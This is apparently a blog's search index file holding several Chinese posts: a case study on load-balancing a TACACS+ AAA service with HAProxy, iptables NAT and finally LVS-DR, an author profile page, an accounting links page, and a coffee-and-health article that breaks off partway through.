<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>基于LVS的AAA负载均衡架构实践</title>
    <url>/2016/09/01/AAA/</url>
    <content><![CDATA[<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p>本次分享将从一次实际的负载均衡改造案例出发，通过介绍项目背景、选型思路、测试方法和问题分析等方面展开，总结负载均衡架构的一般套路和经验教训。</p>
<span id="more"></span>
<h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><p>项目背景是某企业的AAA管理系统， AAA 即 Authentication（认证）、Authorization（授权）、Accounting（记账），是网络设备的一种集中化管理机制，可以在不同设备上为用户设置不同的权限，对网络安全起到监视作用。</p>
<p>AAA 服务是基于 TACACS+协议（Terminal Access Controller Access Control System Plus），TACACS＋是在 TACACS 协议的基础上进行了功能增强的安全协议，最早由Cicso提出并开放标准。该协议与 RADIUS 协议的功能类似，采用客户端/服务器模式实现 网元与 TACACS+ 服务器之间的通信，使用TCP 49端口。</p>
<p>每次TACACS+ 交互主要实现：<br>认证 (Authentication): 确认访问网络的用户身份，判断访问者是否合法<br>授权( Authorization ): 对通过认证的用户，授权其可以使用哪些服务<br>记账( Accounting )：记录用户的操作行为、发生时间</p>
<h4 id="1-问题描述"><a href="#1-问题描述" class="headerlink" title="1.问题描述"></a><strong>1.问题描述</strong></h4><p>系统架构如下图所示，服务器采用一主一备模式，一般情况下由Master服务器处理请求，如果它故障或者负荷过高、无法快速响应请求，网元会将请求发送到BackUP服务器处理。AAA Server上运行守护进程处理请求，记为TACACSD。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LB-AAA-Now.png" alt=""></p>
<p><strong>容量计算</strong></p>
<blockquote>
<p>服务端资源需求T＝ 认证请求规模g(n) ／ TACACSD运算能力 f(n)  </p>
</blockquote>
<p>在很长一段时间内，原有架构可以满足应用需求，但是随着集中化的深入推进，资源不足的问题日益严重：Master负荷早已爆满，BackUP的负荷也几乎与Master相当，而且请求从Master切换到BackUP的时候，非常容易引起失败。<br>主要有三个关键因子的变化：<br>1、管理设备数量增长10倍，而且还要继续增长<br>2、网络配置自动化，单一网元的巡检、配置操作有数量级的提升<br>3、TACACSD程序本身存在性能瓶颈，CPU消耗随着设备数量增长而增长</p>
<p>前两个因素属于业务需求，不能调整，程序性能问题涉及开发周期问题（这块以后再单独分析），迫于业务压力，我们必须快速寻找一种变通方案。</p>
<h4 id="2-选型要求"><a href="#2-选型要求" class="headerlink" title="2.选型要求"></a><strong>2.选型要求</strong></h4><p>在选择适用方案之前，我们必须考虑以下几个要求：</p>
<p><strong>可伸缩性（Scalability）</strong><br>当服务规模（设备数量、自动化操作次数）的负载增长时，系统能被扩展来满足需求（弹性扩展服务能力），且不降低服务质量。</p>
<p><strong>高可用性（Availability）</strong><br>尽管部分硬件和软件会发生故障，整个系统的服务必须是每天24小时每星期7天可用的。（必须去除原来过于依赖单一服务器的瓶颈）</p>
<p><strong>可管理性（Manageability）</strong><br>整个实现应该易于管理，提供灵活的负载均衡策略支持。</p>
<p><strong>价格有效性（Cost-effectiveness）</strong><br>整个实现是经济的。这个怎么说呢，比如这个问题吧，有人说：买四层交换机啊？ 没钱！宇宙上最好服务器来一台？ 没钱！！<br>于是我们的主要探索方向放在了开源软件，感谢开源社区解救穷人。</p>
<h2 id="二、前戏"><a href="#二、前戏" class="headerlink" title="二、前戏"></a>二、前戏</h2><p>我们首先想到的是HAProxy，一款经典的负载均衡开源软件。<br>特别是具备以下几个特点：配置维护简单，支持热备，支持后端服务器的状态检测，可以自动摘除故障服务器；支持TCP 代理；支持Session的保持。</p>
<blockquote>
<p>tcp<br>The instance will work in pure TCP mode.<br>A full-duplex  connection will be established between clients and servers,<br>and no layer 7 examination will be performed.<br> This is the default mode. It should be used for SSL, SSH, SMTP, …</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi haproxy.cfg</span><br><span class="line">listen AAA-Cluster</span><br><span class="line">         mode tcp      </span><br><span class="line">         <span class="built_in">bind</span> 49</span><br><span class="line">         option tcplog</span><br><span class="line">         <span class="built_in">source</span> 0.0.0.0 usesrc clientip</span><br><span class="line">         server AAA-Server-210 192.168.3.10:49</span><br><span class="line">         server AAA-Server-211 192.168.3.11:49</span><br></pre></td></tr></table></figure>
<h4 id="1-HAProxy-TProxy"><a href="#1-HAProxy-TProxy" class="headerlink" title="1.HAProxy+TProxy"></a><strong>1.HAProxy+TProxy</strong></h4><p>当我们满怀希望地推进之时，一个要命的问题摆在面前：后端的AAA服务器上看到的连接的Source IP都不再是用户原始的IP，而是前端的HAProxy服务器的IP，</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LB-AAA-HAProxy.png" alt=""></p>
<p>官方文档对于source调度算法的描述：</p>
<blockquote>
<p>source<br>The source IP address is hashed and divided by the total weight of the &gt;<br>running servers to designate which server will receive the request.<br>This ensures that the same client IP address will always reach the same<br>server as long as no server goes down or up.<br>If the hash result changes due to the number of running servers<br>changing, many clients will be directed to a different server.</p>
</blockquote>
<p>TACACSD进程必须获取到认证请求的Source IP，为此我们尝试引入TProxy。<br>它允许你”模仿”用户的访问IP，就像负载均衡设备不存在一样，TProxy名字中的T表示的就是transparent(透明)。当网元发起的认证请求到达后端的AAA服务器时，可以通过抓包看到的请求Source IP就是网元的真实IP。</p>
<p>即使用上“HAProxy+TProxy”的组合拳，还是存在另外一个问题：<br><strong>设备对于认证结果报文，似乎需要请求报文的目标地址（代理服务器）与结果报文的发送端（Real  AAA Server）一致。</strong><br><img src="http://riboseyim-qiniu.riboseyim.com/LB-AAA-Flow.png" alt=""></p>
<p>过程描述：网络设备会发送该用户的凭证到 TACACS+ 服务器进行验证，然后决定分配访问相关设备的权限，并将这些决定的结果包含在应答数据包中并发送到网络设备上，再由网络设备发送到用户终端。<br><strong>至于是否真的是这个校验规则，或者我们还没有找到更好的解释。暂且搁置，引述一段RFC 1492的说明，日后再补充这个问题。</strong><br>CONNECT(username, password, line, destinationIP, destinationPort)<br>returns (result1, result2, result3)</p>
<p>This request can only be issued when the username and line specify<br>an already-existing connection.  As such, no authentication is<br>required and the password will in general be the empty string. It<br>asks, in the context of that connection, whether a TCP connection<br>can be opened to the specified destination IP address and port.</p>
<h4 id="2-IPTABLES-NAT"><a href="#2-IPTABLES-NAT" class="headerlink" title="2.IPTABLES NAT"></a><strong>2.IPTABLES NAT</strong></h4><p>为了解决上述Proxy无法传递Source IP 的问题，我们还尝试过基于 iptables 实现网络地址转换的方式，It’s Working !!<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 49 -j DNAT --to 192.168.3.10-192.168.3.13</span><br><span class="line"></span><br><span class="line">$ sudo iptables -L -t nat -n -v</span><br><span class="line">Chain PREROUTING (policy ACCEPT 0 packets, 0 bytes)</span><br><span class="line"> pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination         </span><br><span class="line">    0     0 DNAT       tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0           tcp dpt:49 to:192.168.3.10-192.168.3.13</span><br><span class="line"></span><br><span class="line">Chain POSTROUTING (policy ACCEPT 0 packets, 0 bytes)</span><br><span class="line"> pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination         </span><br><span class="line">    0     0 MASQUERADE  tcp  --  *      *       192.168.122.0/24    !192.168.122.0/24    masq ports: 1024-65535</span><br><span class="line">    0     0 MASQUERADE  udp  --  *      *       192.168.122.0/24    !192.168.122.0/24    masq ports: 1024-65535</span><br><span class="line">    0     0 MASQUERADE  all  --  *      *       192.168.122.0/24    !192.168.122.0/24    </span><br><span class="line"></span><br><span class="line">Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)</span><br><span class="line"> pkts bytes target     prot opt <span class="keyword">in</span>     out     <span class="built_in">source</span>               destination     </span><br></pre></td></tr></table></figure><br>如上即可解决HAProxy的Source IP 传递和报文回路的问题。<br>压力测试的时候，开始设备数比较少的时候，各项业务还很正常，当设备数加到1.5万台左右，或者几百台设备并发请求的时候，报文转发的时延久急剧上升，甚至出现丢包情况。这个方案对我们来说显然存在性能瓶颈。</p>
<blockquote>
<p>HAProxy—&gt;HAProxy + TProxy —&gt;IPTABLES NAT</p>
</blockquote>
<p>转了一圈，回到起点。</p>
<h2 id="三、终极杀器"><a href="#三、终极杀器" class="headerlink" title="三、终极杀器"></a>三、终极杀器</h2><p>经过之前一波三折的折腾，我们决定启用一款终极杀器：LVS。<br>LVS即Linux Virtual Server，是一个虚拟的服务器集群系统。它有三种工作模式NAT(地址转换),IP Tunneling(IP隧道)、Direct Routing(直接路由)。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th><strong> </strong></th>
<th><strong>NAT模式</strong></th>
<th><strong> TUN模式</strong></th>
<th><strong> DR模式</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Server</td>
<td>any</td>
<td>Tunneling</td>
<td>Non-arp device</td>
</tr>
<tr>
<td>Server Network</td>
<td>private</td>
<td>LAN/WAN</td>
<td>LAN</td>
</tr>
<tr>
<td>Server Number</td>
<td>low(10-20)</td>
<td>HIGH(100)</td>
<td>HIGH(100)</td>
</tr>
<tr>
<td>Server Gateway</td>
<td>load balancer</td>
<td>own router</td>
<td>own router</td>
</tr>
</tbody>
</table>
</div>
<p>基于之前NAT方面的不良体验，我们这次直接选择了LVS-DR模式，<br>LVS支持八种调度算法，我们选择轮询调度（Round-Robin Scheduling）。</p>
<p>LVS只处理一般连接,将请求给后端real server,然后由real server处理请求直接相应给用户,Direct Routing与IP Tunneling相比，没有IP封装的开销。</p>
<p>缺点：由于采用物理层,所以DR模式的调度器和后端real server必须在一个物理网段里,中间不能过路由器。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LB-AAA-LVS-Single.png" alt=""></p>
<p>另外，为了防止LVS控制机的单点故障问题，还选用了Keepalived，负责LVS控制机和备用机的自动故障切换。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/LB-AAA-LVS-Cluster.png" alt=""></p>
<p>LVS依赖项：IPVS内核模块和ipvsadm工具包。<br>具体配置不做过多说明，可以自行检索，关键注意以下几点：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1）检查服务器是否已支持ipvs</span></span><br><span class="line">modprobe -l |grep itvs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2）检查依赖包：</span></span><br><span class="line">rpm -q kernel-devel</span><br><span class="line">rpm -q gcc</span><br><span class="line">rpm -q openssl</span><br><span class="line">rpm -q openssl-devel</span><br><span class="line">rpm -q popt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3）配置realserver节点ARP及VIP绑定脚本</span></span><br><span class="line">vi /etc/init.d/lvs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4）启动LVS-DR</span></span><br><span class="line">/etc/init.d/lvsdr start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5）查看VIP 情况</span></span><br><span class="line">ip addr list</span><br><span class="line"></span><br><span class="line"><span class="comment">#6）启动realserver节点LVS</span></span><br><span class="line"></span><br><span class="line">/etc/init.d/lvs start</span><br></pre></td></tr></table></figure>
<h2 id="五、小结"><a href="#五、小结" class="headerlink" title="五、小结"></a>五、小结</h2><h4 id="1-各种负载均衡实现在网络中的位置"><a href="#1-各种负载均衡实现在网络中的位置" class="headerlink" title="1. 各种负载均衡实现在网络中的位置"></a><strong>1. 各种负载均衡实现在网络中的位置</strong></h4><p><img src="http://riboseyim-qiniu.riboseyim.com/LB-Normal-Model.png" alt=""></p>
<p>四层负载均衡的特点一般是在网络和网络传输层(TCP/IP)做负载均衡，而七层则是指在应用层做负载均衡。<br>四层负载均衡对于应用侵入比较小，对应用的感知较也少，同时应用接入基本不需要对此做特殊改造。<br>七层负载均衡一般对应用本身的感知比较多，可以结合一些通用的业务负载逻辑做成很细致的方案，比如我们通常用HAProxy/Nginx来做网站流量的分发。</p>
<blockquote>
<p>实践再次教育我们，天下没有一招鲜，任何技术都有它的江湖位置。</p>
</blockquote>
<h4 id="2-仿真能力"><a href="#2-仿真能力" class="headerlink" title="2. 仿真能力"></a><strong>2. 仿真能力</strong></h4><p>这次实践可以用一句话概括就是：“成也仿真，败也仿真”。<br>起初走了很长一段弯路，可以说是因为对整个负载均衡体系的理解不深入，也可以说是测试不足导致，凭着惯性，想当然地认为可以简单复制原来的“经验”，而<br>忽视了实验环境的构建。</p>
<p>后来可以快速推进，是因为重新规整了测试方法和目标，并且基于虚拟机搭建了验证环境，包括引入了可以仿真路由器的GNS3平台，完整地测试了真实的业务流程。LVS集群环境也是先完成构建、试运行一段时间之后才完成的业务割接。</p>
<p>IPTABLES NAT的方案并没有在早期发现性能瓶颈，也说明这快的测试能力不足。</p>
<h4 id="3-花边故事"><a href="#3-花边故事" class="headerlink" title="3.花边故事"></a><strong>3.花边故事</strong></h4><p>HAProxy的官网目前是被封锁的，国内不翻墙访问不了，Why ?<br>在他们家的操作手册后面有LVS、Nginx的推荐链接。以前并没有注意。</p>
<p>TPROXY最早是作为Linux内核的一个patch，从linux-2.6.28以后TPRXOY已经进入官方内核。iptables只是Linux防火墙的管理工具而已，位于/sbin/iptables。真正实现防火墙功能的是Netfilter，它是Linux内核中实现包过滤，如果要探讨Netfilter，又会是一个很长的故事。</p>
<p>LVS开始于1998年，创始人是章文嵩博士，从Linux2.4内核以后，已经完全内置了LVS的各个功能模块。到今天为止，依然是目前国内IT业界达到Linux标准内核模块层面的唯一硕果。章博士同时是前淘宝基础软件研发负责人、前阿里云CTO，三个月前刚转会到滴滴打车任副总裁。淘宝技术体系曾大规模使用了LVS，不过最新消息，淘宝的同学已经鼓捣出一个VIPServer，正逐步替代了LVS。</p>
<p>罗列的这几条信息，其实与这次的主题关系不大，但确是整理这次篇帖子过程中，感觉很有意思的事情。技术并不冰冷，它就像个江湖，到底还是关于人的故事。</p>
<h3 id="续集"><a href="#续集" class="headerlink" title="续集"></a>续集</h3><blockquote>
<p>可能更新，也可能不更新。</p>
</blockquote>
<p>1、本次场景中，HAProxy方案为什么会失败？还缺少一个深度解释。<br>2、本次场景中，LVS方案采用默认的轮询算法是否最优？<br>3、本次场景中，7X24系统如何完成服务切换？<br>4、本次场景中，IPTables NAT 的性能瓶颈如何解释？<br>5、来一个关于 Netfilter 的讨论</p>
<h4 id="案例与实务"><a href="#案例与实务" class="headerlink" title="案例与实务"></a>案例与实务</h4><ul>
<li><a href="https://riboseyim.github.io/2016/07/17/OpenSource-StackOverflow/">最佳工程实践：Stack Overflow 架构 - 2016 Edition</a></li>
<li><a href="https://riboseyim.github.io/2016/06/12/Technology-Oracle/">最佳工程实践：Oracle 数据库迁移割接实践</a></li>
<li><a href="https://riboseyim.github.io/2016/09/01/AAA/">最佳工程实践：基于LVS的AAA负载均衡架构实践</a>  </li>
<li><a href="https://code.facebook.com/posts/1906146702752923/open-sourcing-katran-a-scalable-network-load-balancer/">VIPServer | Facebook Open-sourcing Katran, a scalable network load balancer</a></li>
</ul>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ul>
<li><a href="https://www.juniper.net/documentation/en_US/junose15.1/topics/concept/tacacs+-understanding.html">Understanding TACACS+</a></li>
<li><a href="https://www.cisco.com/c/en/us/support/docs/security-vpn/remote-authentication-dial-user-service-radius/13838-10.html">TACACS+ and RADIUS Comparison</a></li>
<li><a href="https://www.haproxy.com/blog/haproxy-2-0-and-beyond/">HAProxy 2.0 and Beyond</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MDE0Mjc4MA==&amp;mid=2650992803&amp;idx=1&amp;sn=e2a46917301941faacc324af29013877&amp;scene=1&amp;srcid=0802RpC2Vu41WGWU7UBbBjXH#rd">章文嵩博士和他背后的负载均衡帝国</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MDE0Mjc4MA==&amp;mid=2650992696&amp;idx=1&amp;sn=c8a768b9acfa9ff1d0c9700a53c067a5&amp;scene=1&amp;srcid=0802JvqGeuM8Y3xbeTNSrIeO#rd">章文嵩：怎样做开源才有意义？</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzAxOTAzMDEwMA==&amp;mid=2652500704&amp;idx=1&amp;sn=dd29070b0748edf4ac68676d4e149005&amp;chksm=80201bdbb75792cd675f614719b28aedd7f4a317cb561e7a7dd08d875f32572c0c0624978e2c&amp;scene=1&amp;srcid=0920Jb7OAAb7C1C02eAA7i5T#rd">胥峰(盛大):KVM部署LVS集群故障案例一则</a></li>
<li><a href="http://blog.csdn.net/dog250/article/details/77993563">iptables CLUSTERIP构建独特的负载均衡集群 | 赵亚，2017-09-16</a></li>
<li><a href="https://mp.weixin.qq.com/s/izHMBYI_Z7OI_GrHvvS-DQ">Google 是如何做负载均衡的？| 2017-01-03 oilbeater TGO鲲鹏会</a></li>
<li><a href="https://www.haproxy.com/blog/application-layer-ddos-attack-protection-with-haproxy/">Application-Layer DDoS Attack Protection with HAProxy | by Chad Lavoie | Nov 9, 201</a></li>
<li><a href="https://kerneltalks.com/networking/how-to-forward-port-using-iptables-in-linux/">How to forward port using iptables in Linux</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>SRE</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>OpenSource</tag>
        <tag>eBook</tag>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title>About</title>
    <url>/2016/05/31/AboutMe/</url>
    <content><![CDATA[<h2 id="Contact"><a href="#Contact" class="headerlink" title="Contact"></a>Contact</h2><ul>
<li>Home Site : <a href="https://riboseyim.github.io">https://riboseyim.github.io</a></li>
<li>Tech Blog : <a href="https://riboseyim.com">https://riboseyim.com</a></li>
<li>Email : <a href="mailto:riboseyim@gmail.com">riboseyim@gmail.com</a>.</li>
<li><a href="http://www.linkedin.com/in/%E7%9D%BF-%E4%B8%A5-b39028110">Linkedin Profile</a></li>
</ul>
<!-- - My [resume online](https://riboseyim.github.io/resume.html). -->
<h2 id="Community"><a href="#Community" class="headerlink" title="Community"></a>Community</h2><p>Follow me on Twitter at <a href="https://twitter.com/RiboseYim">@RiboseYim</a></p>
<ul>
<li>Telegram channel: <a href="https://t.me/riboseyim">https://t.me/riboseyim</a></li>
<li><a href="https://t.zsxq.com/6aYVJIy">知识星球「睿哥读书会」</a></li>
</ul>
<h2 id="年表"><a href="#年表" class="headerlink" title="年表"></a>年表</h2><ul>
<li><a href="https://riboseyim.github.io/2018/12/31/Check2019/">Year of 2019:年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2018/01/01/Check2018/">Year of 2018:年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/04/10/Check2017/">Year of 2017:年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/01/01/Check2016/">Year of 2016:年度盘点</a></li>
<li><a href="https://riboseyim.github.io/2017/04/28/Check2012/">Year of 2012:年度盘点</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/RiboseYim-Head-2017-500.png" alt=""></p>
<h2 id="Technology-amp-Skills"><a href="#Technology-amp-Skills" class="headerlink" title="Technology &amp; Skills"></a>Technology &amp; Skills</h2><h4 id="BASIC"><a href="#BASIC" class="headerlink" title="BASIC"></a>BASIC</h4><ul>
<li>Communicate</li>
<li>Writing</li>
<li>Report</li>
</ul>
<h4 id="Project"><a href="#Project" class="headerlink" title="Project"></a>Project</h4><ul>
<li>Team Leadership</li>
<li>Network Planning</li>
</ul>
<h4 id="Engineering"><a href="#Engineering" class="headerlink" title="Engineering"></a>Engineering</h4><ul>
<li>Prototype analysis</li>
</ul>
<h2 id="发明专利"><a href="#发明专利" class="headerlink" title="发明专利"></a>发明专利</h2><h5 id="网络设备安全认证服务可靠性增强方法、系统（第一发明人）"><a href="#网络设备安全认证服务可靠性增强方法、系统（第一发明人）" class="headerlink" title="网络设备安全认证服务可靠性增强方法、系统（第一发明人）"></a><a href="#">网络设备安全认证服务可靠性增强方法、系统（第一发明人）</a></h5><h5 id="终端接入办公网络安全管控方法及认证服务器（第一发明人）"><a href="#终端接入办公网络安全管控方法及认证服务器（第一发明人）" class="headerlink" title="终端接入办公网络安全管控方法及认证服务器（第一发明人）"></a><a href="#">终端接入办公网络安全管控方法及认证服务器（第一发明人）</a></h5><h5 id="201811427043-2-网络故障诊断方法和系统（第一发明人）"><a href="#201811427043-2-网络故障诊断方法和系统（第一发明人）" class="headerlink" title="201811427043.2 网络故障诊断方法和系统（第一发明人）"></a><a href="#">201811427043.2 网络故障诊断方法和系统（第一发明人）</a></h5><p>本发明提供一种网络故障诊断方法、系统，采用网络历史数据中的症状数据集以及故障数据集对梯度提升树分类器预测模型进行训练，然后利用训练后的梯度提升树分类器预测模型进行网络故障诊断，能够有效提高网络故障诊断精度，并能够有效缩短网路故障诊断时间，适应多样化生产场景。</p>
<h5 id="201711294715-2-网络设备安全管理系统、方法及计算机可读存储介质（第一发明人）"><a href="#201711294715-2-网络设备安全管理系统、方法及计算机可读存储介质（第一发明人）" class="headerlink" title="201711294715.2 网络设备安全管理系统、方法及计算机可读存储介质（第一发明人）"></a><a href="#">201711294715.2 网络设备安全管理系统、方法及计算机可读存储介质（第一发明人）</a></h5><p>本发明实施例提供了一种网络设备安全管理系统、方法及计算机可读存储介质，其中，该系统包括:管理控制机，用于接收分别为每个用户账号和每个网络设备设置的管理策略，并将管理策略实时发送给认证机;所述认证机，用于接收网络设备发送的通过用户账号发起的认证请求和操作授权请求，根据所述网络设备的管理策略和所述用户账号的管理策略分别响应所述认证请求和所述操作授权请求，实现对所述网络设备的安全管理。</p>
<h5 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h5><ul>
<li><a href="#">201911233006.2 机房市电停电监测方法及装置</a></li>
</ul>
]]></content>
      <categories>
        <category>站长信息</category>
      </categories>
      <tags>
        <tag>我的自传</tag>
      </tags>
  </entry>
  <entry>
    <title>会计学 | Overview of Accounting</title>
    <url>/2017/10/23/Accounting/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="Assessment"><a href="#Assessment" class="headerlink" title="Assessment"></a>Assessment</h2><ul>
<li><p><a href="https://www.crunchbase.com" target="_blank" rel="noopener">https://www.crunchbase.com</a>   </p>
</li>
<li><p><a href="https://www.funderbeam.com" target="_blank" rel="noopener">https://www.funderbeam.com</a>  </p>
</li>
</ul>
<h2 id="Reporting"><a href="#Reporting" class="headerlink" title="Reporting"></a>Reporting</h2><h4 id="智臻智能-834869"><a href="#智臻智能-834869" class="headerlink" title="智臻智能 | 834869"></a><a href="http://stockpage.10jqka.com.cn/834869/finance/#view" target="_blank" rel="noopener">智臻智能 | 834869</a></h4><ul>
<li><a href="http://stockpage.10jqka.com.cn/834869/finance/#view" target="_blank" rel="noopener">智臻智能 | 834869 | 财务报表 - 杜邦分析</a></li>
<li><a href="http://wenshu.court.gov.cn/content/content?DocID=9680dfb7-d63b-423b-ba86-67231f6d4477" target="_blank" rel="noopener">上海智臻智能网络科技股份有限公司、苹果电脑贸易（上海）有限公司与国家知识产权局专利复审委员会再审行政裁定书</a></li>
</ul>
<h2 id="gov"><a href="#gov" class="headerlink" title="gov"></a>gov</h2><ul>
<li><a href="http://law.lawtime.cn/d606727611821.html" target="_blank" rel="noopener">公安业务费开支范围和管理办法的规定 | 1991</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.infoq.com/cn/news/2012/09/tendon-toc-ta" target="_blank" rel="noopener">商业软件工程——产出会计和约束理论</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>嗑药简史：咖啡上瘾，喝还是不喝？</title>
    <url>/2018/05/14/Addiction-Decision-Coffee/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>咖啡的保健作用及临床实证研究案例</li>
<li>咖啡种类、制作工艺对健康效益的影响</li>
</ul>
<a id="more"></a>
<blockquote>
<p>Finder 和 MacWrite还是有很多缺陷。Randy Wigginton带了一大袋巧克力咖啡豆和一堆含有咖啡因的饮料来帮我们对付接下来几天的瞌睡虫。我们每过几个小时就更新软件版本，每解决一个重大的缺陷就发布一次。—— Andy Hertzfeld. 《硅谷革命：成就苹果公司的疯狂往事》</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/100315_coffee_opener_NEW_0.jpg" alt></p>
<h1 id="嗑药简史：咖啡上瘾，喝还是不喝？"><a href="#嗑药简史：咖啡上瘾，喝还是不喝？" class="headerlink" title="嗑药简史：咖啡上瘾，喝还是不喝？"></a>嗑药简史：咖啡上瘾，喝还是不喝？</h1><p>对于一种历史上曾不被信任的饮料，咖啡被证明是一种健康的上瘾（healthy addiction）。</p>
<p>早在 20 世纪 80 年代，挪威研究人员的报告中就已经提出咖啡似乎可以抵御肝脏疾病。从那时起，已经有研究显示深褐色饮料出对肝癌、二型糖尿病、心脏病和中风等具有保健价值。咖啡甚至可以预防抑郁症（depression）、帕金森病（Parkinson）和阿尔茨海默病（Alzheimer）。总的来说，研究结果非常惊人。美国研究人员在 2012 年报告说，一天喝两杯或更多杯咖啡的人比不喝咖啡的人长寿。日本、苏格兰和芬兰的研究结论也是如此。</p>
<p>咖啡因（caffeine）具有轻微成瘾性。咖啡不仅能让你振作起来，也可能会使你的情绪低落。目前，咖啡依然被很多人视为不利健康。它可能是世界上消费最广泛的饮料之一，但是人们一直认为，至少具有咖啡因活性的咖啡仍然有问题。“人们注意到咖啡因，” 心脏病学家 Arthur Klatsky 说，他在 Kaiser Permanente （位于加利福尼亚州·奥克兰）研究咖啡几十年。“大众通常认为，任何对神经系统有影响的东西都会有坏的东西。”</p>
<p>在 20 世纪 70 年代的研究中，咖啡怀疑者表示咖啡有心脏病风险。也有传言说它可能阻碍生长或致癌。没错，咖啡对某些人来说有负面影响，但并不包括上述担忧。</p>
<p>孕妇应该更加慎重，因为过量的咖啡因与流产风险有关。含咖啡因的咖啡会干扰睡眠或使人紧张。咖啡因可以增加心率，但其与慢性高血压（chronic high blood）的联系目前仍存在疑问。</p>
<p>新加坡国立大学的一位荷兰籍营养流行病学家 Rob van Dam 说：“饮用咖啡并不是一定与高血压联系在一起。” 事实上，大多数与咖啡和咖啡因有关的忧虑，包括胃溃疡，胃酸反流和称为 heart flutter 的心脏颤动（atrial fibrillation），在大量的研究中并没有出现。事实上，大多数研究表明咖啡有益或至少无害。</p>
<p>因此，大众对于咖啡饮料的观念正在改变。但是，由于科学家还没有完全确定咖啡是如何工作的，所以接受的速度很慢。在其成分中，咖啡因（caffeine）和多酚（polyphenols）显然是积极的参与者，但除此之外，其它的咖啡成分及作用就非常复杂了。</p>
<p>哈佛大学营养流行病学家 Frank Hu 说，“要研究出咖啡中各种成分的影响是非常困难的，因为它们中有很多难以分离的成分。” “他们总是搅和在一起。”</p>
<h2 id="保护肝脏"><a href="#保护肝脏" class="headerlink" title="保护肝脏"></a>保护肝脏</h2><p>咖啡最明显的好处是肝脏保健功能，肝是一个庞大大而繁忙的器官。食物中的营养物质通过胃肠道吸收并进入血液。这些营养素在肝脏代谢 - 排毒 - 调节血脂和血糖。</p>
<p>慢性肝病影响美国 15％ 的人口。肝脏最常因饮酒过量，感染丙型肝炎病毒或发生与肥胖有关的脂肪肝疾病而受损。正如皮肤在受损区域会形成坚硬的胶原蛋白斑块一样，肝脏也是如此。随着时间的推移，这一过程会导致纤维化的胶原瘢痕或纤维化（fibrosis），纤维化可能破坏血液流过肝脏。肝纤维化的潜在风险就是肝硬化（cirrhosis），最终导致肝衰竭（liver failure），Jonathan Dranoff 如是说，它是一位胃肠病学家和肝病学家，来自阿肯色大学医学院（University of Arkansas for Medical Sciences ，小石城）。</p>
<p>当肝脏感受到组织损伤时，复方腺苷（compound adenosine）与肝脏星状细胞（stellate cells）上的受体蛋白（receptor proteins）结合 —— 它们使胶原蛋白形成纤维性疤痕。咖啡因与腺苷受体结合并中断信号传导过程（interrupts the signaling process），从而抑制胶原蛋白大量生产。</p>
<blockquote>
<p>肝脏一直是神秘生理学的重要标志。它是最大的器官，它含有最多的血液，被认为是人类内脏中最黑暗、最深不可测的器官。因此，它被认为包含了命运的秘密，被用来算命。在柏拉图时代及后来的生理学中，肝脏代表着最黑暗的激情，特别是愤怒、嫉妒和贪婪的血腥烟雾，驱使人们的行为。因此，肝脏意味着感情冲动的生命本身。— 詹姆斯·希尔曼(James Hillman),心理学家，深度心理学最重要的代表人物之一。</p>
</blockquote>
<p>咖啡因抑制胶原蛋白过度生产的第二种方式是：它能够影响谷丙转氨酶（即肝功能检查中的 ALT 指标），这种酶与肝纤维化有关。同样是肝脏疾病患者，日常饮用咖啡的人（含咖啡因）比少量饮用者产生的酶更少。</p>
<p>在美国去年的一项大型研究中也显示，每天喝两杯或更多杯咖啡的能抑制这个麻烦的酶。其他研究表明，咖啡中的某些多酚（在咖啡豆或普通咖啡中发现）可以降低 ALT 水平（knock down）。</p>
<p>患有丙型病毒肝炎（可导致肝纤维化和癌症的病毒感染）的咖啡饮者，也显示出类似的益处。根据2010 年《Hepatology》的一项研究，177 名肝病患者中（大多数患有丙型肝炎），每天喝两杯以上咖啡（含咖啡因）的人比很少喝咖啡者的纤维化低。奇怪的是，其他来源的咖啡因，如能量饮料，则没有发现这项益处。</p>
